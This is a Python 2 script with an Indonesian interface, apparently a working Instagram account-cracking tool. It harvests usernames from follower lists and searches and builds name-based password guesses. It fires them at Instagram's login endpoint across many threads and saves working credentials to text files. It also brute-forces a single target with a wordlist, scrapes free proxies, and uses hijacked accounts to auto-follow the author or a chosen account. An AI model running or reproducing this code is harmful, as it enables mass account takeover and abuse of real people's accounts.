#!/usr/bin/python2
# coding=utf-8
# Author: IqbalDev
# Tool Instaram
# Versi 0.5

a = "\033[96;1m"
p = "\033[97;1m"
h = "\033[92;1m"
k = "\033[93;1m"
m = "\033[91;1m"
d = "\033[90;1m"

import os
try:
	import concurrent.futures
except ImportError:
	print k+"\n Modul Futures blom terinstall!..."
	os.system("pip install futures" if os.name == "nt" else "pip2 install futures")
try:
	import requests
except ImportError:
	print k+"\n Modul Requests blom terinstall!..."
	os.system("pip install requests" if os.name == "nt" else "pip2 install requests")

try:
	from bs4 import BeautifulSoup
except ImportError:
	print k+"\n Modul Bs4 blom terinstall!..."
	os.system("pip install bs4" if os.name == "nt" else "pip2 install bs4")

import os, requests, re, json, random, sys, platform, base64,datetime, subprocess, time
from calendar import monthrange
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

garis = h+"+++>"

data_= []
hasil_ok = []
hasil_cp = []
c=1

status_foll =[]
data_followers = []
pencarian_ = []
platform_dev = str(platform.platform()).lower()
p1 = base64.b64encode(platform_dev)
list_proxy = []

try:
	has_ok = open("hasil_ok.txt", "r").readlines()
	with open("hasil_ok.txt", "w") as tul:
		tul.write("")
	for dev in set(has_ok):
		with open("hasil_ok.txt", "a") as tu:
			tu.write(dev)
except:
	pass
try:
	has_cp = open("hasil_cp.txt", "r").readlines()
	with open("hasil_cp.txt", "w") as tul:
		tul.write("")
	for dev in set(has_cp):
		with open("hasil_cp.txt", "a") as tu:
			tu.write(dev)
except:
	pass

url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}

def hapus_cookie():
	try:
		os.system("del cookie.txt" if os.name == "nt" else "rm -rf cookie.txt")
	except:
		pass
def hapus_cokiz():
	try:
		os.system("del cokiz.txt" if os.name == "nt" else "rm -rf cokiz.txt")
	except:
		pass

def cek_hasil():
	print garis
	print h+" >"+k+" 1"+p+". Cek Hasil "+h+"OK/Live"
	print h+" >"+k+" 2"+p+". Cek Hasil "+k+"Checkpoint"
	print h+" >"+k+" 3"+m+". Hapus"+p+" Hasil "+k+"Checkpoint"+p+"/"+h+"Live"
	print garis
	while True:
		pil = raw_input(a+" ? "+p+"Pilih"+h+": ")
		if pil == "1":
			try:
				hasil_ok_ = open("hasil_ok.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+h+"Live\n"
				for dev in hasil_ok_:
					ok = dev.replace("\n", "").split("==>")
					print a+"  {"+k+"Live"+a+"} "+h+ok[1]+a+" | "+p+ok[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_ok_))
			except:
				print k+"\n Belum ada hasil"+h+" OK"
			break
		elif pil == "2":
			try:
				hasil_cp_ = open("hasil_cp.txt", "r").readlines()
				print k+"\n >_"+p+" Menampilkan Hasil "+k+"Checkpoint\n"
				for dev in hasil_cp_:
					cp = dev.replace("\n", "").split("==>")
					print a+"  {"+p+"Chek"+a+"} "+k+cp[1]+a+" | "+d+cp[3]
				print h+"\n >_< "+p+"Jumlah"+k+": "+str(len(hasil_cp_))
			except:
				print k+"\n Belum ada hasil"+p+" CP"
			break
		elif pil == "3":
			print "   "+ garis
			print  h+"   >"+k+" 1"+m+". Hapus"+p+" Hasil "+k+"Live"
			print  h+"   >"+k+" 2"+m+". Hapus"+p+" Hasil "+k+"Checkpoint"
			print "   "+ garis
			while True:
				pil_hps = raw_input(a+"   ? "+p+"Pilih"+h+": ")
				yakin = raw_input(a+"   ? "+p+"Yakin mau Hapus?"+h+" y/n: ")
				if pil_hps == "1" and yakin == "y":
					try:
						os.system("del hasil_ok.txt" if os.name == "nt" else "rm -rf hasil_ok.txt")
						print h+"\n    Sukses Hapus Hasil Live\n"
					except:
						print k+"\n    Belum ada Hasil Live\n"
					exit()
				elif pil_hps == "2" and yakin == "y":
					try:
						os.system("del hasil_cp.txt" if os.name == "nt" else "rm -rf hasil_cp.txt")
						print h+"\n    Sukses Hapus Hasil Checkpoint\n"
					except:
						print k+"\n    Belum ada Hasil Checkpoint\n"
					exit()
				elif yakin == "n":
					exit()
				else:
					pass
		else:
			pass

def cek_login():
	global cookie
	try:
		cok = open("cookie.txt", "r").read()
	except IOError:
		login_dev()

	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses_dev:
			try:
				login_coki = ses_dev.get(url, cookies={"cookie": cok}, headers=headerz_api)
				if "users" in json.loads(login_coki.content):
					cookie = {"cookie": cok}
				else:
					print m+"\n Cookie Kedaluarsa...\n"
					hapus_cookie()
					login_dev()	
			except ValueError:
				print m+"\n Cookie Kedaluarsa...\n"
				hapus_cookie()
				login_dev()
			except requests.exceptions.ConnectionError:
				print m+"\n Tidak ada Koneksi Internet...\n"
				exit()

def login_dev_cookie():
	global cookie
	print "\n  Login Instagram\n"
	cok = raw_input(" Masukkan Cookie: ")
	with requests.Session() as ses_dev:
		login_coki = ses_dev.get(url_instagram, cookies={"cookie": cok}, headers=headerz)
		if "viewer_has_liked" in str(login_coki.content):
			print " Login Suksess...."
			with open("cookie.txt", "w") as tulis_coki:
				tulis_coki.write(cok)
			cookie = {"cookie": cok}
		else:
			print " Login gagal...."
			exit()

def data_pencarian_dev(cookie, nama, limit):
	url = "https://www.instagram.com/web/search/topsearch/?count={}&context=blended&query={}&rank_token=0.21663777590422106&include_reel=true".format(limit,nama)
	with requests.Session() as ses_dev:
		res_dat_pencarian = ses_dev.get(url, cookies=cookie, headers=headerz)
		for dev in json.loads(res_dat_pencarian.content)["users"]:
			users = dev["user"]
			print " Username:",users["username"]
			print " Nama:",users["full_name"].encode("utf-8")
			print "-"*50

lis_prox = []
c=1
def cek_proxy(proxy):
	try:
		respon = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3).json()["origin"]
		print " >> Live -- "+proxy
		list_proxy.append(proxy)
		c+=1
	except:
		pass

def scrap():
	lis_prox_dev = []
	url="https://free-proxy-list.net/#list"
	with requests.Session() as ses_dev:
		respon = ses_dev.get(url)
		sop = BeautifulSoup(respon.content, "html.parser")
		tbody = sop.find("tbody")
		for dev in tbody.find_all("tr"):
			prox = dev.find_all("td", class_=False)
			lis_prox_dev.append(str(prox))
			print prox
		for dev in lis_prox_dev:
			pecah = dev.split(",")
			ip = pecah[0].replace("<td>", "").replace("</td>","").replace("[", "")
			port = pecah[1].replace("<td>", "").replace("</td>","").replace("[", "").strip(" ")
			lis_prox.append(ip+":"+port)

	with ThreadPoolExecutor(max_workers=20) as dev:
		for prox in lis_prox:
			dev.submit(cek_proxy, prox)
c_foll = 1
count_foll = 1
def follow_dev(ses_dev, username_dev):
	global c_foll, count_foll
	if len(status_foll) != 1:
		user_target = "iqbaldev__"
		id_target = "12629128399"
	else:
		print h+"\r >>> Follow {}/{}|Chek+{}/Live+{}  ".format(str(count_foll),len(data_),len(hasil_cp), len(hasil_ok)),
		sys.stdout.flush()
		user_target = username_get_follow
		id_target = id_

	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_dev.post(url_follow, headers=headerz_foll)
	if len(status_foll) != 1:
		pass
	else:
		print h+"\r ["+k+">-"+h+"] "+p+str(c_foll)+" "+k+username_dev+h+" Sukses Mengikuti "+p+user_target+k+" >_< \n"
		c_foll+=1
		count_foll+=1

def login_dev():
	global cookie
	print ""
	print a+"  {"+p+" Login Instagram "+a+"}"
	print m+"   ----------------"
	print garis
	username_dev = raw_input(a+" ?"+p+" Masukkan Username"+h+": ")
	pass_dev = raw_input(a+" ?"+p+" Masukkan  Sandi"+d+": ")
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()

			if "userId" in str(data_dev):
				print p+"\n *"+h+" Suksess Login.."
				for dev in da:
					with open("cookie.txt", "a") as tulis:
						tulis.write(dev+"="+da[dev]+";")
				follow_dev(ses_dev, username_dev)
				cok = open("cookie.txt","r").read()
				cookie = {"cookie": cok}

			elif "checkpoint_url" in str(data_dev):
				print k+"\n Akun Cp"

			elif "Please wait" in str(data_dev):
				print m+" >>> Mainkan Mode Pesawat!! >>"

			else:
				print m+"\n Gagal Login...."
				exit()
				
	except KeyboardInterrupt:
		exit()

None
def data_follower_dev(cookie, id_target, limit, opsi):
	global c
	if opsi == "1":
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif opsi == "2":
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		exit(" Error..")
	with requests.Session() as ses_dev:
		res_dat_foll = ses_dev.get(url, cookies=cookie, headers=headerz_api)
		for dev in json.loads(res_dat_foll.content)["users"]:
			username = dev["username"]
			nama = dev["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				#print("\r [*] mengambil user : %s%s%s"%(H,len(data_),N)),
				#sys.stdout.flush()
				data_.append(username+"==>"+nama.decode("utf-8"))
				c+=1
			else:
				data_followers.append(username)
None
def info_dev(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti
		da = requests.get("https://www.instagram.com/{}/?__a=1".format(username_dev), headers={"User-Agent": user_agentz})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
		if status == "Live":
			print h+"\r ["+k+">-"+h+"]"+p+" Status: "+h+status + "                 "
			print h+"\r ["+k+">-"+h+"]"+p+" Nama: "+h+ str(nama) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" pengikut: "+k+ str(pengikut) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" mengikuti: "+k+ str(mengikuti) + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" Username: "+h+ username_dev + "              "
			print h+"\r ["+k+">-"+h+"]"+p+" Password: "+h+ pass_dev + "             \n"
		elif status == "Checkpoint":
			print k+"\r ["+p+">-"+k+"]"+p+" Status: "+k+status + "                 "
			print k+"\r ["+p+">-"+k+"]"+p+" Nama: "+k+ str(nama) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" pengikut: "+p+ str(pengikut) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" mengikuti: "+p+ str(mengikuti) + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" Username: "+k+ username_dev + "              "
			print k+"\r ["+p+">-"+k+"]"+p+" Password: "+k+ pass_dev + "             \n"
		else:
			pass
	except:
		pass
None
count_= 1
def crack_dev(username_dev, pass_dev_):
	global c, count_
	c_pw = len(pass_dev_)
	for pass_satu in pass_dev_:
		try:
			if "\n" in pass_satu:
				t_dev = "Cek"
			else:
				t_dev = "Crack"
			if c != 1:
				pass
			else:
				if len(status_foll) != 1:
					print h+"\r >>>\033[97;1m "+t_dev+" \033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m/\033[96;1m{}\033[97;1m|\033[93;1mChek+{}\033[97;1m/\033[92;1mLive+{}      ".format(str(c_pw),str(count_),len(data_),len(hasil_cp), len(hasil_ok)),
					sys.stdout.flush()
					c_pw -= 1
				else:
					pass
			pass_dev = pass_satu.lower().replace("\n", "")
			try:
				if username_dev in hasil_ok or username_dev in hasil_cp:
					break
				try:
					headerz = {"User-Agent": user_agentz_api}
					with requests.Session() as dev:
						url_scrap = "https://www.instagram.com/"
						data = dev.get(url_scrap, headers=headerz).content
						crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
					header = {
							"Accept": "*/*",
							"Accept-Encoding": "gzip, deflate, br",
							"Accept-Language": "en-US,en;q=0.5",
							"Host": "www.instagram.com",
							"X-CSRFToken": crf_token,
							"X-Requested-With": "XMLHttpRequest",
							"Referer": "https://www.instagram.com/accounts/login/",
							"User-Agent": user_agentz,}
					param = {
							"username": username_dev,
							"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), pass_dev),
							"optIntoOneTap": False,
							"queryParams": {},
							"stopDeletionNonce": "",
							"trustedDeviceRecords": {}}
				except:
					header = {}
					param = {}
					pass			
				with requests.Session() as ses_dev:
					url = "https://www.instagram.com/accounts/login/ajax/"
					respon = ses_dev.post(url, data=param, headers=header)
					data_dev = json.loads(respon.content)
					time.sleep(00.1)
					if "checkpoint_url" in str(data_dev):
						cp = "Checkpoint"
						info_dev(username_dev, pass_dev, cp)
						with open("hasil_cp.txt", "a")as dev_:
							dev_.write("[Chek]==>"+username_dev+"==>|==>"+pass_dev+"\n")
						hasil_cp.append(username_dev)
						break

					elif "userId" in str(data_dev):
						live = "Live"
						if len(status_foll) != 1:
							info_dev(username_dev, pass_dev, live)
							with open("hasil_ok.txt", "a")as dev_:
								dev_.write("[Live]==>"+username_dev+"==>|==>"+pass_dev+"\n")
							hasil_ok.append(username_dev)
						else:
							hasil_ok.append("dev_id")
							follow_dev(ses_dev,username_dev)
						break

					elif "Please wait" in str(data_dev):					
						print m+"\rHidupin Matiin Mode Pesawat 2detik!"+k+" {}".format(str(c)),
						c+=1
						sys.stdout.flush()
						pass_dev_iq = [pass_dev]
						crack_dev(username_dev, pass_dev_iq)
						count_ -= 1
	 
					else:
						c = 1
						pass

			except requests.exceptions.ConnectionError:			
				print k+"\r Tidak ada koneksi Internet...!>> {}".format(str(c)),
				sys.stdout.flush()
				c+=1
				pass_dev_iq = [pass_dev]
				crack_dev(username_dev, pass_dev_iq)
				count_ -= 1

			except:
				c = 1
				pass
		except:
			c = 1
			pass

	count_+=1

None

def crack():
	with ThreadPoolExecutor(max_workers=30) as insta_dev:
		for dataku in data_:
			try:
				pw = []
				data = dataku.encode("utf-8")
				dat_ = data.split("==>")[0]
				pw_ = data.split("==>")[1]
				pw_nam = pw_.split()
				if len(pencarian_) != 1:
					if len(dat_) >= 6:
						pw.append(dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							pw.append(pw_nam[0]+"123")
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)
		
					else:
						# pw.append(dat_+dat_)
						if len(pw_nam[0]) <= 2:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							if len(pw_) >= 6:
								pw.append(pw_)

						else:
							if len(pw_nam) >= 2:
								pw.append(pw_nam[0]+pw_nam[1])
							pw.append(pw_nam[0]+"123")
							if len(pw_) >= 6:
								pw.append(pw_)
				else:
					pw.append(pw_nam[0]+"123")
					# pw.append(pw_nam[0]+"12345")
					pw.append(dat_)

				insta_dev.submit(crack_dev, dat_, pw)
			except:
				pass


def auto_follow(status_):
	global data_foll_,data_
	if status_ == "auto_follow":
		try:
			data_ok = open("hasil_ok.txt", "r").readlines()
			for dev in data_ok:
				pecah = dev.split("==>")[1]
				if pecah not in data_followers:
					print p+"\r >- "+a+"Yang Belum Mengikuti:\033[93;1m {}".format(len(data_)),
					sys.stdout.flush()
					data_.append(dev+y)
			print "\n"
			with ThreadPoolExecutor(max_workers=3) as insta_foll:
				for data_foll in data_:
					try:
						pw_foll = []
						data_foll_ = data_foll
						us_foll = data_foll_.split("==>")[1]
						pw_foll.append(data_foll_.split("==>")[3])
						insta_foll.submit(crack_dev, us_foll, pw_foll)
					except:
						pass
		except:
			pass
	elif status_ == "iqbal_dev":
		try:
			data_cp = open("hasil_cp.txt", "r").readlines()
			for dev in data_cp:
				data_.append(dev)
		except:
			exit()
		with ThreadPoolExecutor(max_workers=10) as insta_cek_dev:
			for data_cek in data_cp:
				try:
					pw_cp_ = []
					user_cp = data_cek.split("==>")[1]
					pw_cp = data_cek.split("==>")[3]
					pw_cp_.append(pw_cp)
					insta_cek_dev.submit(crack_dev, user_cp, pw_cp_)
				except:
					pass

None
c = 1
def brute(email_dev, san_dev_):
	for san_dev_1 in san_dev_:
		try:
			global c
			san_dev = san_dev_1.lower()
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				headerz = {"User-Agent": user_agentz_api}
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {
								"Accept": "*/*",
								"Accept-Encoding": "gzip, deflate, br",
								"Accept-Language": "en-US,en;q=0.5",
								"Host": "www.instagram.com",
								"X-CSRFToken": crf_token,
								"X-Requested-With": "XMLHttpRequest",
								"Referer": "https://www.instagram.com/accounts/login/",
								"User-Agent": user_agentz,}
				param = {
								"username": email_dev,
								"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_dev),
								"optIntoOneTap": False,
								"queryParams": {},
								"stopDeletionNonce": "",
								"trustedDeviceRecords": {}}
			print k+str(c)+h+" >>>"+p+" Mencoba Password: "+h+san_dev+"                "
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url, data=param, headers=header)
				data_dev = json.loads(respon.content)
				l = q.replace(q, "")
				if "checkpoint_url" in str(data_dev):
					cp = "Checkpoint"
					print h+"\n ---{"+p+" Password Ditemukan "+k+">_< "+h+"}---\n"+l
					print h+" ["+k+">_"+h+"]"+p+" Status: "+k+cp
					print h+" ["+k+">_"+h+"]"+p+" Nama: "+h+nama
					print h+" ["+k+">_"+h+"]"+p+" Pengikut: "+k+str(pengikut)
					print h+" ["+k+">_"+h+"]"+p+" Mengikuti: "+k+str(mengikuti)
					print h+" ["+k+">_"+h+"]"+p+" Username: "+h+email_dev
					print h+" ["+k+">_"+h+"]"+p+" Password: "+h+san_dev
					print ""
					break
				elif "userId" in str(data_dev):
					live = "Live"
					print h+"\n ---{"+p+" Password Ditemukan "+k+">_< "+h+"}---\n"+l
					print h+" ["+k+">_"+h+"]"+p+" Status: "+h+live
					print h+" ["+k+">_"+h+"]"+p+" Nama: "+h+nama
					print h+" ["+k+">_"+h+"]"+p+" Pengikut: "+k+str(pengikut)
					print h+" ["+k+">_"+h+"]"+p+" Mengikuti: "+k+str(mengikuti)
					print h+" ["+k+">_"+h+"]"+p+" Username: "+h+email_dev
					print h+" ["+k+">_"+h+"]"+p+" Password: "+h+san_dev
					print ""
					break

				elif "Please wait" in str(data_dev):					
					print m+str(c)+" >>> Mainkan Mode Pesawat!! >>"+l
					san_dev_split = san_dev.split()
					brute(email_dev, san_dev_split)
				else:
					pass
					c+=1
		except requests.exceptions.ConnectionError:
			san_dev_split = san_dev.split()
			brute(email_dev, san_dev_split)

		except KeyboardInterrupt:
			exit("\n Keluar....")
		except:
			pass

None
def crack_target():
	pw_none = ""
	status_none = ""
	word_list = []
	word_list_crack = []
	user_target = raw_input(a+"\n ? "+p+"Masukkan Username Target"+k+": ")
	time.sleep(2)
	print h+" * "+p+"Mengumpulkan Informasi..."
	info_dev(user_target, pw_none, status_none)
	nama_pecah = nama.split()
	angka = [123,1234,12345]
	word_list.append(nama.replace(" ", ""))
	word_list.append(nama)
	for dev in angka:
		if len(nama_pecah) >= 2:
			word_list.append(nama.replace(" ", "")+str(dev))

		if len(nama_pecah) >= 1:
			for sub_dev in nama_pecah:
				word_list.append(sub_dev)
				word_list.append(sub_dev+str(dev))

		if len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			for dev_ in angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(dev_))

			word_list.append(nama_pecah[1]+nama_pecah[0])
			for dev_ in angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(dev_))

	word_list.append(user_target)
	for iq in set(word_list):
		if len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "sayang123", "bismillah", "bismilah", "bismillahh", "anjing", "anjing123", "bangsat", "bajingan", "kontol", "password","pasword", "sandi123"]
	for f in pw_tambahan:
		word_list_crack.append(f)

	print h+" * "+p+"Berhasil Membuat "+k+str(len(word_list_crack))+p+" Wordlist"
	time.sleep(2)
	print ""
	brute(user_target, word_list_crack)

None
def _yuk_(iqbaldev):
	import string
	try:
		open("cokiz.txt", "r").read()
	except IOError:
		d_str = []
		fu = base64.b64encode(iqbaldev+"O")
		for str_ in str(string.ascii_lowercase):
			d_str.append(str_)
			
		for i_ in fu:
			with open("cokiz.txt", "a") as iq:
				iq.write(i_+random.choice(d_str)+"%")

def _uyuk_():
	global followerz,followerzz,fol_dev,q,wak_
	try:
		fol_tam = ""
		fol_tamzz = ""
		fol_z = open("cokiz.txt", "r").read().split("%>")
		for dev_fol in fol_z[0].split("%"):
		  try:
			fol_tam += dev_fol[0]
		  except:
		  	pass
		followerz = base64.b64decode(fol_tam)
		if platform_dev != base64.b64decode(fol_z[2]):
			pass
		else:
			try:
				for dev_folzz in fol_z[1].split("%"):
					try:
						fol_tamzz += dev_folzz[0]
					except:
						pass
				fol_dev = base64.b32decode(fol_tamzz)
				followerzz = fol_dev.replace("U", "")
				q=followerzz
			except:
				pass
			try:
				wak_ = base64.b64decode(fol_z[3]).split()
			except:
				pass
	except:
		pass

None
_uyuk_()
def pilihan(pil):
	global username_get_follow
	proses_crack = h+" * "+p+"Tunggu proses Crack...!"
	if pil == "1":
		pas = ""
		status = ""
		username = raw_input(a+"\n ?"+p+" Masukkan Username Target"+h+": ")
		info_dev(username, pas, status)

		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username+p+" >> "+k+str(mengikuti)
		print garis
		pil2 = raw_input(a+" ?"+p+" Pilih"+k+": ")
		limit = input(a+" ?"+p+" Masukkan Limit"+k+": ")
		if pil2 == "1":
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		elif pil2 == "2":
			data_follower_dev(cookie, id_, limit, pil2)
			print 
			print proses_crack
			print "\n"
			crack()
		else:
			pass

	elif pil == "2":
		print garis
		usr_ = raw_input(a+" ?"+p+" Masukkan Nama"+k+": ")
		jm = input(a+" $"+p+" Masukkan Jumlah"+h+": ")
		us = usr_.replace(" ", "")
		pencarian_.append("iqbal_dev")
		data_.append(us+"==>"+us)
		data_.append(us+"_"+"==>"+us)
		for dev in range(1, jm+1):
			data_.append(us+str(dev)+"==>"+us)
			data_.append(us+"_"+str(dev)+"==>"+us)
			data_.append(us+str(dev)+"_"+"==>"+us)
		print ""
		print proses_crack
		print "\n"
		crack()
	elif pil == "3":
		crack_target()
	elif pil == "4":
		cek_hasil()
	elif pil == "5":
		pas = ""
		status = ""
		status_foll.append("IqbalDev")
		print garis
		username_get_follow = raw_input(a+"  ?"+p+" Masukkan Username Target"+k+": ")
		info_dev(username_get_follow, pas, status)
		print garis
		print p+" ["+k+"1"+p+"] Pengikut "+h+username_get_follow+p+" >> "+k+str(pengikut)
		print p+" ["+k+"2"+p+"] Yang Diikuti "+h+username_get_follow+p+" >> "+k+str(mengikuti)
		print garis
		raw_input(p+" >_"+a+" Enter Untuk Lanjut.. ")
		print garis
		data_follower_dev(cookie, id_, limit=1000000000, opsi="1")
		pil_dev = "auto_follow"
		auto_follow(pil_dev)
	elif pil == "6":
		print h+"\n >>>"+a+" Tunggu Proses...\n"
		pil_dev = "iqbal_dev"
		auto_follow(pil_dev)
	elif pil == "7":
		import os
		try:
			os.system("git clone https://github.com/IqbalDev/insta_dev")
			os.system("rm -rf insta_dev.py")
			os.system("rm -rf install.py")
			os.system("cp -f insta_dev/* \\.")
			os.system("rm -rf insta_dev")
			os.system("chmod 777 *")
			print h+"\n Sukses Update Tool.."+p+">_<\n"
		except:
			print "\n Perangkat Tidak Suport\n"
	elif pil == "8":
		kel = raw_input(k+" > Yakin Mau Keluar dari akun Instagram? "+p+"y/n"+h+": ")
		if kel in ["y", "Y"]:
			hapus_cookie()
			print " > Keluar...."
		else:
			print h+" > Silahkan Jalankan lagi toolnya.."
	elif pil == "hapus_premium":
		hapus_cokiz()
		print p+"\n >_"+h+" Premium Telah Dihapus...\n"
	else:
		print m+" Pilih yang benar...."

None
def menu_dev():
	print baner
	print k+" >_"+h+" Author:"+k+" IqbalDev"
	print k+" >_"+h+" Coding:"+k+" Python27"
	print versi
	print a+" ["+k+"@"+a+"] "+h+"Premium Sampe Kau Jadi Yatim"
	print garis
	print a+" ["+k+"1"+a+"] "+p+"Crack dari followers Publik"
	print a+" ["+k+"2"+a+"] "+p+"Crack dari Pencarian Orang"
	print a+" ["+k+"3"+a+"] "+p+"Crack Target"
	print a+" ["+k+"4"+a+"] "+p+"Cek hasil"+h+" OK"+a+"/"+k+"CP"
	print a+" ["+k+"5"+a+"] "+p+"Auto Followers"
	print a+" ["+k+"6"+a+"] "+h+"Cek Login hasil Akun"+k+" CP"
	print a+" ["+k+"7"+a+"] "+p+"Update Tool"
	print a+" ["+k+"8"+a+"] "+p+"Log Out Akun Instagram"
	print garis
	pil = raw_input(p+"  ? Pilih"+k+": ")
	pilihan(pil)


baner = """
.__  """+h+"""+{ I G E H }+"""+a+""" __        ______               
|  | ___   _______/  |_____  \____ \   ______  __
|  |/   \ /  ___/\   __\__ \  |  |  \_/ _ \  \/ /
|  |   | \\\___ \  |  |  / _ \_|  `   \  __/\   / 
|__|___| /____  > |__| (__  /_____  /\___  >\_/  
        /     \/          \/      \/     \/      
	"""
versi = k+" >_"+h+" Versi_:"+p+" 0.5\n"
if __name__=="__main__":
	cek_login()
	menu_dev()
